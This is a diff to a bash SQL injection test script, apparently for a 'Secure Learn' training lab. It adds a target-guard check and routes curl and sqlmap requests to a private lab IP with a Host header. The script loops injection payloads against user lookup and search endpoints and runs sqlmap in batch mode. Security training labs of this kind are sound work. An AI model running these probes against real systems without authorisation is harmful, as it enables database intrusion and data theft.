@@ -4,6 +4,24 @@
 
 set -e
 
+# Resolve the repository copy when run from source and the read-only mounted
+# copy when run in the attack container. No external command runs before the
+# target profile is validated.
+ATTACK_SCRIPT_PATH="${BASH_SOURCE[0]}"
+ATTACK_SCRIPT_DIR="${ATTACK_SCRIPT_PATH%/*}"
+if [[ "$ATTACK_SCRIPT_DIR" == "$ATTACK_SCRIPT_PATH" ]]; then
+    ATTACK_SCRIPT_DIR=.
+fi
+if [[ -r "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh" ]]; then
+    source "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh"
+elif [[ "$ATTACK_SCRIPT_DIR" == "/scripts" && -r "/secure-learn-target-guard.sh" ]]; then
+    source "/secure-learn-target-guard.sh"
+else
+    echo "ERROR: Secure Learn target guard is unavailable." >&2
+    exit 64
+fi
+secure_learn_validate_target
+
 # Configuration
 TARGET="${TARGET:-app}"
 TARGET_IP="${TARGET_IP:-172.23.0.20}"
@@ -24,7 +42,7 @@ OUTPUT_FILE="$OUTPUT_DIR/s3_sqli_$(date +%Y%m%d_%H%M%S).txt"
 
 # Check if target is reachable
 echo "Checking target connectivity..."
-if ! curl -s --connect-timeout 5 "http://$TARGET:$TARGET_PORT/" > /dev/null 2>&1; then
+if ! curl -s --connect-timeout 5 -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/" > /dev/null 2>&1; then
     echo "ERROR: Target is not reachable at http://$TARGET:$TARGET_PORT"
     exit 1
 fi
@@ -35,7 +53,7 @@ echo "============================================"
 echo "Phase 1: Normal Request (Baseline)"
 echo "============================================"
 echo "GET /users?id=1"
-curl -s "http://$TARGET:$TARGET_PORT/users?id=1" | jq . 2>/dev/null || echo "(no valid JSON response)"
+curl -s -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/users?id=1" | jq . 2>/dev/null || echo "(no valid JSON response)"
 echo ""
 
 echo "============================================"
@@ -60,7 +78,7 @@ for payload in "${sqli_payloads[@]}"; do
     echo "Request: GET /users?id=$encoded_payload"
     
     if ! response=$(curl -s --max-time 5 -w "\nHTTP_CODE:%{http_code}" \
-        "http://$TARGET:$TARGET_PORT/users?id=$encoded_payload"); then
+        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/users?id=$encoded_payload"); then
         response=$'\nHTTP_CODE:000'
     fi
     
@@ -81,7 +99,8 @@ echo "============================================"
 # Run sqlmap
 echo "Running sqlmap (batch mode)..."
 sqlmap_status=0
-sqlmap -u "http://$TARGET:$TARGET_PORT/users?id=1" \
+sqlmap -u "http://$TARGET_IP:$TARGET_PORT/users?id=1" \
+    --headers="Host: $TARGET" \
     --batch \
     --level=3 \
     --risk=2 \
@@ -116,7 +135,7 @@ for payload in "${search_payloads[@]}"; do
     echo "Request: GET /users/search?name=$encoded_payload"
     
     if ! response=$(curl -s --max-time 5 -w "\nHTTP_CODE:%{http_code}" \
-        "http://$TARGET:$TARGET_PORT/users/search?name=$encoded_payload"); then
+        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/users/search?name=$encoded_payload"); then
         response=$'\nHTTP_CODE:000'
     fi
     
